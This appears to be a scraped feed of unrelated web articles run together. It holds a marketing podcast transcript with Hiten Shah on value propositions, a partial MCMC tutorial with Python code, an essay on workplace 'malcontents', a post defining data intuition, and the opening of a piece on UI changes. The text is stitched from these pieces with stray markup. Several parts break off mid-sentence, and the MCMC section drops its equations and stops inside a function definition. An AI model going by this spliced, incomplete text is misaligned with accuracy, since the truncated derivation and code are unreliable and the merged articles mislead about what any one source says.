<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><b>Louis:</b><span> Bonjour, bonjour and welcome to another episode of Everyone Hates Marketers.com. The no fluff, actionable marketing podcast, for people sick of shady, aggressive marketing.</span></p>
<p><span>I’m your host, Louis Grenier. In today’s episode, you learn how to test different value propositions for whatever you’re offering your product or service, and pick which one you’d like to resonate the most with your audience.</span></p>
<p><span>My guest today you probably know him. He’s the co-founder and the CEO of FYI, a solution to have all of your documents in one place, and is the co-owner of Crazy Egg as well. He’s a serial entrepreneur, founded multiple software companies over the last 20 years or so. And I’m super happy to have him on board because.. obviously I believe that customer feedback and truly understanding your customer is the first step towards success, towards building something that people would care about. So that’s why I’m super happy to have you Hitan Shah onboard. Welcome.</span></p>
<p><b>Hiten:</b><span>Thanks for having me</span></p>
<p><b>Louis:</b><span> Let’s get started straight away. How do you define what a value proposition is, you have extensive experience launching products, dating them side projects, et cetera. But how do you define what a value proposition is?</span></p>
<p><b>Hiten:</b><span> Yeah. In short, I think it’s what, one sort of entity, if you want to call it, that can do for another.</span></p>
<p><span>And that it’s very simple. and the reason I would put it that way is because a value proposition can exist between any, basically two entities. So it could be an individual and an organization. It could be an organization or an organization. It could be an individual and an individual.</span></p>
<p><span>And it’s basically the value that one entity delivers to another. And the value proposition is how that sort of quantified, communicated, realized, et cetera. And the typical way people think about this is your business has a value proposition for its customers. The way I think about it is that.</span></p>
<p><span>Your value proposition for a business, a service, one human to another is what they’re getting from you, that is of value to them. And when you think about it that way, I think it really defines, it defines what this means and what it means is that it’s not up to you. Who’s giving the value, whether it’s an organization or individual to the other person to be like, Oh, here’s my value proposition for you.</span></p>
<p><span>It actually more works the other way around where that person or that company organization, group of individuals is like, this is what that other entity, organization, person does for me. And this is why it’s valuable. And I think that’s the basis of the value proposition is this idea that it’s in someone else’s mind. It’s not in your mind. The one who’s delivering the value. It’s the other party’s mind.</span></p>
<p><span>So it’s generous, it’s a way to think about it. Generously thinking about your people first, what do they want? And you provide that to them. You don’t start with your, with you being self centered and then think of your product.</span></p>
<p><b>Louis:</b><span> And now, what is our value proposition? Then let’s find people who would care about it. It’s really the opposite. You think of those people first, what they care about because it’s, that’s what they care about is themselves, right?</span></p>
<p><b>Hiten:</b><span> Yeah. if you don’t do that, then whatever value proposition you come up with, you’re throwing darts against the wall and hoping something just sticks and it’s probably not going to hit the bullseye for sure.</span></p>
<p><span>So you, you think of it the other way, and you think about these people and what their needs are and, I don’t know, I’ve seen that in every single, basically business I’ve started or business I’ve talked to somebody about it. It doesn’t even matter what it is. It’s that there’s this sort of effect where no matter what I say I’m doing for you, if you don’t agree, I don’t get to have your business.</span></p>
<p><span>I don’t get to be in that relationship with you. And you could go all the way to dating. You could go to marriage, you could go to any type of business. This will work. Because the value, the whole idea of a value proposition is it’s for somebody else. It’s not for the person who’s delivering the value.</span></p>
<p><span>And what I mean by that is like my understanding of it as a person, delivering value is only valuable if it relates to how I’m delivering value to somebody else. Or some other organization or whatever, and this is why this method works. No matter what industry you’re in. Like I said, it boils down to even relationships.</span></p>
<p><span>I think relationships are a set of value propositions to each other, And like when they fall apart, it’s usually because value is not met. Some expectation of that value is not delivered on and that’s it.</span></p>
<p><b>Louis:</b><span> Yeah. That’s when you’re diving very deep into a topic when you see it everywhere, when you go back to first principles, fundamental truth. Which is the way I like to think. So it’s great to hear. So before we actually go through a step by step on how to actually test value propositions, if you have a few in mind and how maybe how to come up with them in the first place. Based on your experience, you said you have funded multiple, very successful companies, you’ve probably advised a lot as well, being in touch with a lot of people. What do you think are the top two other mistakes folks are doing when it comes to value proposition? Besides the main one you described there?</span></p>
<p><b>Hiten:</b><span> Yeah. Let me even give you an example from right now, if I may. So you said, I said, certain things about the businesses I started. In reality, you said it, I didn’t say it. So in a way, it’s really like what people get wrong is they don’t pay attention to basically this idea that, look you said it, not me. And if you said it’s in your mind. So for example, you said that the businesses I’ve started have been successful.</span></p>
<p><span>I didn’t say that. You didn’t even ask me if they have been, right? Because if you would’ve asked me, I would have said successful? I don’t really know what that means. I think I tried my best, the teams did, and we got where we got, and here we are. Like whether that big thing is over or the thing is still going, that eye of the beholder is not me. The eye of the beholder is you, so thank you for saying that. I think there’s some level of credibility, maybe I have as a result of what’s in other people’s minds, but in my mind, I don’t know. Cause it doesn’t matter. So I think what people get wrong is they try to make up the value propositions, in their own heads about what they’re doing.</span></p>
<p><span>Oftentimes, because what they’re doing is something that they want to see exist in the world. And they haven’t really thought about whether it should exist to other people. I know this might sound like what I just said, you know what we’ve been talking about, but it is a second point. The second point is it doesn’t matter what you think.</span></p>
<p><span>Like it just doesn’t. so a lot of times people will come up with things and it’s just wrong because their whole idea of a value proposition is based on what they think about it. So if you asked me about my businesses, I would go into a lot of detail, about them and what happened, but I would never use the word successful, but you did.</span></p>
<p><span>So that means that I’m not saying I should, but it’s just information for me, regardless of what I think. And I think that there’s a resistance oftentimes to what other people think about something of yours and that resistance. Yeah.</span></p>
<p><b>Louis:</b><span> Let’s, sorry to cut through there, but I think you’re about to touch on it.</span></p>
<p><span>Let’s talk about this resistance. Where do you think it’s mainly coming from?</span></p>
<p><b>Hiten:</b><span> A lot of places. I think it usually comes from some form of a reaction that you have to what you just heard and whether that reaction is positive or negative. That’s really what sort of shapes your own ability to deal with what you’re hearing, this is one of the biggest problems with value propositions, which is when you don’t personally agree with what you’re hearing.</span></p>
<p><span>And then you bias yourself towards what you actually want something to be when it won’t be that, because nobody’s saying it. So I don’t think if I said my businesses have been successful, that would be as powerful or accurate as someone else saying it, because my definition of it, because it’s mine is going to be different than yours.</span></p>
<p><span>But what I really care about is your definition of it, not mine. And I think there’s a lot of aversion there to being able to see the truth about yourself or the truth about what you’re doing. And the main reason is you get invested in it. So the reason this happens is usually a really strong, emotional investment in what you’re doing and what you want it to be versus the ability to I like to call it, you go where the wind blows.</span></p>
<p><span>So the wind is blowing a certain way, you go there. So a good example of this is like a lawyer who’s really good at, let’s say like trademark law, and yet they want to do, I don’t know, some kind of M&amp;A, yeah. They want to be an M&amp;A lawyer. That’s very different from trademarks, but they happen to be really good at trademarks.</span></p>
<p><span>And everybody knows them as a lawyer. That’s all about trademarks. But they want to do M&amp;A. So think about how much effort they’re going to have to put in to become known and good at being an M&amp;A lawyer and known for it compared to the thing that’s the path of least resistance where the wind is already blowing, which is other people consider them a great trademark lawyer.</span></p>
<p><span>And it’s not to say that they shouldn’t be an M&amp;A lawyer or anything like that. It’s just to say that, like you have a position in people’s minds. And I don’t think you can talk about value propositions without thinking about positioning and positioning to me, is really like when a good service person, human being, whatever has carved out a place in your brain, and that positioning is what I’m really trying to figure out constantly what, when I’m presented with a problem where we need to like, figure out the value proposition.</span></p>
<p><b>Louis:</b><span> They are always though too, when you have 10, like tens of …</span></p></div></div>

</ul>
<p><a href="https://en.wikipedia.org/wiki/Markov_chain_Monte_Carlo">Markov chain Monte Carlo</a> (MCMC) is a powerful class of methods to sample from probability distributions known only up to an (unknown) normalization constant. But before we dive into MCMC, let’s consider why you might want to do sampling in the first place.</p>
<p>The answer to that is: whenever you’re either interested in the samples themselves (for example, inferring unknown parameters in Bayesian inference) or you need them to approximate expected values of functions w.r.t. to a probability distribution (for example, calculating thermodynamic quantities from the distribution of microstates in statistical physics).
Sometimes, only the mode of a probability distribution is of primary interest. In this case, it’s obtained by numerical optimization so full sampling is not necessary.</p>
<p>It turns out that sampling from any but the most basic probability distributions is a difficult task.
<a href="https://en.wikipedia.org/wiki/Inverse_transform_sampling">Inverse transform sampling</a> is an elementary method to sample from probability distributions, but requires the cumulative distribution function, which in turn requires knowledge of the, generally unknown, normalization constant.
Now in principle, you could just obtain the normalization constant by numerical integration, but this quickly gets infeasible with an increasing number of dimensions.
<a href="https://en.wikipedia.org/wiki/Rejection_sampling">Rejection sampling</a> does not require a normalized distribution, but efficiently implementing it requires a good deal of knowledge about the distribution of interest, and it suffers strongly from the curse of dimension, meaning that its efficiency decreases rapidly with an increasing number of variables.
That’s when you need a smart way to obtain representative samples from your distribution which doesn’t require knowledge of the normalization constant.</p>
<p>MCMC algorithms are a class of methods which do exactly that.
These methods date back to a <a href="https://pdfs.semanticscholar.org/7b3d/c9438227f747e770a6fb6d7d7c01d98725d6.pdf">seminal paper by Metropolis et al.</a>, who developed the first MCMC algorithm, correspondingly called <a href="https://en.wikipedia.org/wiki/Metropolis%E2%80%93Hastings_algorithm">Metropolis algorithm</a>, to calculate the equation of state of a two-dimensional system of hard spheres. In reality, they were looking for a general method to calculate expected values occurring in statistical physics.</p>
<p>In this blog post, I introduce the basics of MCMC sampling; in subsequent posts I’ll cover several important, increasingly complex and powerful MCMC algorithms, which all address different difficulties one frequently faces when using the Metropolis-Hastings algorithm. Along the way, you will gain a solid understanding of these challenges and how to address them.
Also, this serves as a reference for MCMC methods in the context of the <a href="https://www.tweag.io/posts/2019-09-20-monad-bayes-1.html">monad-bayes</a> series.
Furthermore, I hope the provided notebooks will not only spark your interest in exploring the behavior of MCMC algorithms for various parameters/probability distributions, but also serve as a basis for implementing and understanding useful extensions of the basic versions of the algorithms I present.</p>
<h2>Markov chains</h2>
<p>Now that we know why we want to sample, let’s get to the heart of MCMC: Markov chains.
What is a Markov chain? Without all the technical details, a Markov chain is a random sequence of states in some state space in which the probability of picking a certain state next depends only on the current state in the chain and not on the previous history: it is memory-less.
Under certain conditions, a Markov chain has a unique stationary distribution of states to which it converges after a certain number of states. From that number on, states in the Markov chain are distributed according to the invariant distribution.</p>
<p>In order to sample from a distribution <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi(x)</annotation></semantics></math></span></span>, a MCMC algorithm constructs and simulates a Markov chain whose stationary distribution is <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi(x)</annotation></semantics></math></span></span>, meaning that, after an initial “burn-in” phase, the states of that Markov chain are distributed according to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi(x)</annotation></semantics></math></span></span>.
We thus just have to store the states to obtain samples from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\pi(x)</annotation></semantics></math></span></span>.</p>
<p>For didactic purposes, let’s for now consider both a discrete state space and discrete “time”.
The key quantity characterizing a Markov chain is the transition operator <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(x_{i+1}|x_i)</annotation></semantics></math></span></span> which gives you the probability of being in state <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">x_{i+1}</annotation></semantics></math></span></span> at time <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">i+1</annotation></semantics></math></span></span> given that the chain is in state <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span></span> at time <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span></span>.</p>
<p>Now just for fun (and for illustration), let’s quickly whip up a Markov chain which has a unique stationary distribution.
We’ll start with some imports and settings for the plots:</p>
<div data-language="python"><pre><code><span>%</span>matplotlib notebook
<span>%</span>matplotlib inline
<span>import</span> numpy <span>as</span> np
<span>import</span> matplotlib<span>.</span>pyplot <span>as</span> plt
plt<span>.</span>rcParams<span>[</span><span>'figure.figsize'</span><span>]</span> <span>=</span> <span>[</span><span>10</span><span>,</span> <span>6</span><span>]</span>
np<span>.</span>random<span>.</span>seed<span>(</span><span>42</span><span>)</span></code></pre></div>
<p>The Markov chain will hop around on a discrete state space which is made up from three weather states:</p>
<div data-language="python"><pre><code>state_space <span>=</span> <span>(</span><span>"sunny"</span><span>,</span> <span>"cloudy"</span><span>,</span> <span>"rainy"</span><span>)</span></code></pre></div>
<p>In a discrete state space, the transition operator is just a matrix.
Columns and rows correspond, in our case, to sunny, cloudy, and rainy weather.
We pick more or less sensible values for all transition probabilities:</p>
<div data-language="python"><pre><code>transition_matrix <span>=</span> np<span>.</span>array<span>(</span><span>(</span><span>(</span><span>0.6</span><span>,</span> <span>0.3</span><span>,</span> <span>0.1</span><span>)</span><span>,</span>
                              <span>(</span><span>0.3</span><span>,</span> <span>0.4</span><span>,</span> <span>0.3</span><span>)</span><span>,</span>
                              <span>(</span><span>0.2</span><span>,</span> <span>0.3</span><span>,</span> <span>0.5</span><span>)</span><span>)</span><span>)</span></code></pre></div>
<p>The rows indicate the states the chain might currently be in and the columns the states the chains might transition to.
If we take one “time” step of the Markov chain as one hour, then, if it’s sunny, there’s a 60% chance it stays sunny in the next hour, a 30% chance that in the next hour we will have cloudy weather, and only a 10% chance of rain immediately after it had been sunny before.
This also means that each row has to sum up to one.</p>
<p>Let’s run our Markov chain for a while:</p>
<div data-language="python"><pre><code>n_steps <span>=</span> <span>20000</span>
states <span>=</span> <span>[</span><span>0</span><span>]</span>
<span>for</span> i <span>in</span> <span>range</span><span>(</span>n_steps<span>)</span><span>:</span>
    states<span>.</span>append<span>(</span>np<span>.</span>random<span>.</span>choice<span>(</span><span>(</span><span>0</span><span>,</span> <span>1</span><span>,</span> <span>2</span><span>)</span><span>,</span> p<span>=</span>transition_matrix<span>[</span>states<span>[</span><span>-</span><span>1</span><span>]</span><span>]</span><span>)</span><span>)</span>
states <span>=</span> np<span>.</span>array<span>(</span>states<span>)</span></code></pre></div>
<p>We can monitor the convergence of our Markov chain to its stationary distribution by calculating the empirical probability for each of the states as a function of chain length:</p>

<p>So that’s lots of fun, but back to sampling an arbitrary probability distribution <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span></span>.
It could either be discrete, in which case we would keep talking about a transition matrix <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span></span>, or be continuous, in which case <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span></span> would be a transition <em>kernel</em>.
From now on, we’re considering continuous distributions, but all concepts presented here transfer to the discrete case.</p>
<p>If we could design the transition kernel in such a way that the next state is already drawn from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span></span>, we would be done, as our Markov chain would… well… immediately sample from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span></span>.
Unfortunately, to do this, we need to be able to sample from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span></span>, which we can’t.
Otherwise you wouldn’t be reading this, right?</p>
<p>A way around this is to split the transition kernel <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(x_{i+1}|x_i)</annotation></semantics></math></span></span> into two parts:
a proposal step and an acceptance/rejection step.
The proposal step features a proposal distribution <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">q(x_{i+1}|x_i)</annotation></semantics></math></span></span>, from which we can sample possible next states of the chain.
In addition to being able to sample from it, we can choose this distribution arbitrarily. But, one should strive to design it such that samples from it are both as little correlated with the current state as possible and have a good chance of being accepted in the acceptance step.
Said acceptance/rejection step is the second part of the transition kernel and corrects for the error introduced by proposal states drawn from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo mathvariant="normal">≠</mo><mi>π</mi></mrow><annotation encoding="application/x-tex">q \neq \pi</annotation></semantics></math></span></span>.
It involves calculating an acceptance probability <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">c</mi></mrow></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_\mathrm{acc}(x_{i+1}|x_i)</annotation></semantics></math></span></span> and accepting the proposal <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">x_{i+1}</annotation></semantics></math></span></span> with that probability as the next state in the chain.
Drawing the next state <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">x_{i+1}</annotation></semantics></math></span></span> from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(x_{i+1}|x_i)</annotation></semantics></math></span></span> is then done as follows:
first, a proposal state <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">x_{i+1}</annotation></semantics></math></span></span> is drawn from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">q(x_{i+1}|x_i)</annotation></semantics></math></span></span>.
It is then accepted as the next state with probability <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">c</mi></mrow></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow></msub><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_\mathrm{acc}(x_{i+1}|x_i)</annotation></semantics></math></span></span> or rejected with probability <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>−</mo><msub><mi>p</mi><mrow><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">c</mi></mrow></msub><mo stretchy="false">(</mo><mi>x</mi><mi mathvariant="normal">_</mi><mrow><mi>i</mi><mo>+</mo><mn>1</mn></mrow><mi mathvariant="normal">∣</mi><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1-p_\mathrm{acc}(x\_{i+1}|x_i)</annotation></semantics></math></span></span>, in which case the current state is copied as the next state.</p>
<p>We thus have</p>

Transition kernels of most MCMC algorithms satisfy this condition.</p>

we know <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>π</mi></mrow><annotation encoding="application/x-tex">\pi</annotation></semantics></math></span></span> only up to a constant, but it doesn’t matter, because that unknown constant cancels out in the expression for <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mrow><mi mathvariant="normal">a</mi><mi mathvariant="normal">c</mi><mi mathvariant="normal">c</mi></mrow></msub></mrow><annotation encoding="application/x-tex">p_\mathrm{acc}</annotation></semantics></math></span></span>!

<p>All right, now that we know how Metropolis-Hastings works, let’s go ahead and implement it.
First, we set the log-probability of the distribution we want to sample from—without normalization constants, as we pretend we don’t know them. Let’s work for now with a standard normal distribution:</p>
<div data-language="python"><pre><code><span>def</span> <span>log_prob</span><span>(</span>x<span>)</span><span>:</span>

October 28, 2020 | https://boz.com/articles/malcontents | <a href="https://web.archive.org/web/*/https://boz.com/articles/malcontents">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><p>There is an important, under appreciated group at every company who are never content no matter how much success they or the company has had. There is a set of people who care so deeply about the company and its products that they take any shortcomings personally. They are offended by bad products and angered by cultural deficiencies. They write passionate notes that nobody asked for and rally people on comment threads in groups they aren’t required to be a part of. They speak truth to power because they are righteous and speak for those who might otherwise have no voice. They aren’t afraid to rock the boat no matter how much the people around them value stability and they can’t be bothered to do it politely. Adam Grant calls these people “<a href="https://www.ted.com/talks/adam_grant_are_you_a_giver_or_a_taker#t-113064">Disagreeable Givers</a>.” I call these people malcontents. And I am one of them.</p>
<p>We malcontents are often confused with <a href="http://boz.com/articles/ownership-and-entitlement.html">entitled whiners</a> but that’s a mistake. Whiners and Malcontents may share the same disagreeable tactics when it comes to complaining, but whiners have poor motivation whereas we malcontents have the best intentions. Whiners want to change the establishment for their own benefit. We malcontents want the establishment to change for its own benefit. Unlike whiners, we malcontents often make personal sacrifices to effect positive change (even if we would rather not be forced to). We often do valuable, unsexy, and sometimes underappreciated work like fixing bugs, improving tools or processes, and helping others. When you see large shifts in culture, organizations, or technology not driven by extrinsic or top down forces there is usually a malcontent behind the scenes or leading the charge.</p>
<p>The fate of malcontents is proof that good intentions and good work simply aren’t enough. Evaluating them exclusively on the impact of their work they are invariably promoted more slowly than their more polite peers. They get feedback constantly that they are doing good work but need to figure out how to do it without frustrating so many people. They are told they need to learn how to influence more effectively. To them it just feels like oppressive politics slowing them and the whole company down. I watched at Facebook as my peer group was consistently promoted a year or two ahead of me. I recall telling my manager at one point after a disappointing review that “this company is going to nice itself to death.” But niceness wasn’t hurting the company. I was. For every person who made me feel good about myself by clicking like on something inflammatory that I wrote there were ten people who quietly wrote me off. Not only did that erode my <a href="http://boz.com/articles/influence-over-authority.html">influence</a> over time it also didn’t help me advance my agenda on whatever issue I was raising.</p>
<p>For the malcontents out there: my advice is to stop and listen to the feedback you are getting. Your team needs you to highlight the opportunities around them and I don’t want you to stop advocating for change but I can tell you from personal experience that your impact is being diluted by your approach. You’re loudly trying to make a change but the tactics you use are costly and only marginally effective. If people think are you are emotional or biased, they will dismiss you. If they think your mind is closed, they will close their own. If they think you are attacking them, they will defend. If you take too much of their time or energy relative to the size of the issue, they will avoid you in the future. Do not fall for the Golden Rule — “Treat others as you wish to be treated” — because nobody else wants to be treated as bluntly as you do. If you do that, you will end up frustrated and marginalized. Instead go for the Platinum Rule: <em>Treat others as they wish to be treated</em>. It is only in expressing your passion through openness, empathy, and relationship building that you can really start to create change at scale.</p>
<p>Instead of just fighting the establishment, you must co-opt it. Find things the people involved care about and frame your concerns in those terms. You can change what the organization cares about by degrees over time, not dramatically overnight. As Richard Hamming said : “By realizing you have to use the system and studying how to get the system to do your work, you learn how to adapt the system to your desires. Or you can fight it steadily, as a small undeclared war, for the whole of your life.”</p>
<p>For those interacting with malcontents: embrace them. Nobody will care more or work harder on behalf of the people who use your product. Make space for them to raise all the concerns they have in an environment where it can be productive and recognize them for the value they bring in doing so when others are too polite to ask hard questions. And when necessary, try to make the cost of their clumsy communication as tangible a possible. Remind them of what their goal is in communicating and then show them how their approach was ineffective and coach them on a more effective approach.</p>
<p>I’m no less personally offended today by bad products or bad practices as I was years ago, but I’m much more effective at turning those emotions into impact. I’m not perfect at it and it isn’t hard to find examples where I’ve missed the mark, but now that I see how effective it can be to communicate more respectfully I find it much easier to do most of the time. I will always be grateful to Facebook for all the critical feedback and patience that got me to where I am. So today I try to pay it forward by identifying malcontents and giving them a little extra space and a lot of extra help.</p></section></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Last week, one of my peers asked me to explain what I meant by "Data Intuition",
and I realized I really didn't have a good definition.
That's a problem! I refer to data intuition all the time!</p>
<p>Data intuition is one of the three skills I interview new data scientists for
(along with statistics and technical skills).
In fact, I just spent the first nine months of 2020
building Mozilla's data intuition.
I'm really surprised to realize I can't point to
a good explanation of what I'm trying to cultivate.</p>
<p>So - I'll make one up. I propose the following definition for Data Intuition:</p>
<blockquote>
<p><strong>Data Intuition is a resilience to misleading data and analyses.</strong></p>
</blockquote>
<p>In other words, it's harder to mislead someone with data
if they have strong data intuition.
Think of this as <strong>a defense against the dark data arts</strong>.</p>
<p>So what does that look like in practice?</p>
<h2>Data Stink</h2>
<p>Someone with strong data intuition can quickly spot "data-stink"
(a close cousin to "<a href="https://en.wikipedia.org/wiki/Code_smell">code smell</a>").
These are data issues that don't necessarily invalidate an analysis,
but certainly draw suspicion on the results.
For example:</p>
<ul>
<li>An analysis prominently reports a seemingly <strong>arbitrary metric</strong> -
  4-day retention increased by 0.5%!
  Where did 4-day retention come from? Don't we usually track 7-day retention?
  This needs more attention before I trust the results.</li>
<li>An analysis reports <strong>extraordinary results</strong> where nominal results are expected -
  this feature increased retention by 10%!
  But, past efforts were trying to increase retention by 0.5% - 
  and isn't retention already 90%? How'd we get and increase of 10%?</li>
</ul>
<p>These are extreme examples. 
Usually the problems are more subtle
and result in a general sense of uneasiness with the results
(that's why it's called "intuition").</p>
<p>It's clear to me that data intuition is <em>related</em> to product intuition,
though these <em>are</em> different skills.
Product intuition can contextualize our results
and make it easier to identify extraordinary claims in analyses.
To know a 10% gain in retention is ridiculous
we need to know that users retain pretty well already.</p>
<h2>Methods issues</h2>
<p>Strong data intuition can also help you 
spot issues with how the analysis was designed.
Things like: how did the author collect data? Is it a representative sample?
Do they need to have an experiment to establish causation?</p>
<p>Here's an example -
say an analysis reports that Firefox users who create a Firefox account
retain 10% higher than users who don't.
By default, a lot of folks interpret this to mean that
if we invest some time in helping users open accounts
we'll see an increase in retention.
Folks with stronger data intuition will instead 
recognize these results are just correlational (not causational).</p>
<p>Users who use the product a lot tend to stick around longer.
Users who open an account are more active users, thus they retain better.
Users who <em>crash</em> Firefox are more active users, and also retain <em>better</em>.</p>
<p>I think this intuition is more than just understanding statistics well.
A strong stats background can help me identify issues
when reading the <em>methods section of a white paper</em>.
Strong data intuition helps me determine how much I trust
results I hear about in a <em>news headline</em>.
Data intuition helps me establish whether results are
<a href="https://blog.harterrt.com/pub-true.html">true-enough</a>.</p>
<h2>More than Skepticism</h2>
<p>I almost defined data intuition as a type of skepticism,
but I think this is a bad characterization.
Skepticism over-focuses on disregarding results.</p>
<p>Intuition is more than being skeptical.
It's <strong>incorporating new data as part of a body of existing knowledge</strong>.
A lot of times, that means deciding new incoming data are inconsistent
and need more investigating before we can trust them.
But other times, it means changing our opinions in the face of new data
that are more authoritative than our existing body of knowledge.</p>
<h2>What do you think?</h2>
<p>I want to hear your thoughts on this.
I'm posting this definition publicly in part because I want to invoke
<a href="https://meta.wikimedia.org/wiki/Cunningham%27s_Law">Cunningham's Law</a>.
The best way to get to the right answer is to post the wrong answer!</p>
<p>Does this definition for data intuition resonate with you?
Am I missing something important? Let me know! 
My email is at the bottom of this page.</p>
<p>I'm spending the next few month building some self-service trainings
to help non-data people at Mozilla build data intuition.
I'd rather be wrong now than next year!</p>

<![CDATA[Sudden Changes in UI: Why It's a Bad Move]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>There’s a reason why change aversion in users is so often spoken about in the world of digital consumerism <span>— </span>human beings love their comfort zones. In the grand scheme of things, we seek out what is familiar to us for a sense of security.</p>
<!--more-->
<p>Keeping your software product updated is important, but it’s also important to make sure the perfective changes you make are within the bounds of what your users are familiar and comfortable with.</p>
<p>Now, what kinds of changes might we be referring to?&nbsp;</p>
<p>The types of changes that can be introduced in a software product are changes in infrastructure, functionality, and interface. Among them, interface changes incite the biggest reactions from users. That’s because it’s the most forefront part of a product that they see and interact with <span>— layout, tabs, fonts, colors, buttons, animation, etc</span>.</p>
